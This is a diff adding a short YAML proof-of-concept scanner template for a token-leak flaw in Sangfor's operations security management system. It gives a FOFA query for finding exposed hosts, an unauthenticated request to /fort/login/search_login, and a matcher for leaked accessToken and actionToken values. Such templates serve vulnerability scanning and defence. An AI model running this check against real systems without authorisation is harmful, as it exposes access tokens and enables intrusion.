@@ -1,0 +1,16 @@
+id: poc-yaml-sangfor-osm-search-login-info-leak
+info:
+  name: 深信服运维安全管理系统 search_login 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 深信服运维安全管理系统
+  fofa: body="/fort/login" && header="FORTSESSIONID"
+requests:
+- method: GET
+  path: /fort/login/search_login
+  expression: status_code == 200 && contains(body,"\"success\":\"success\"") && matches(body,"\"actionToken\":\"([0-9A-Za-z-.]+)\",")
+    && matches(body,"\"accessToken\":\"([0-9A-Za-z-_.]+)\",") && !contains(body,"<")
+    && contains(content_type,"application/json")
+variables: {}
+transport: http
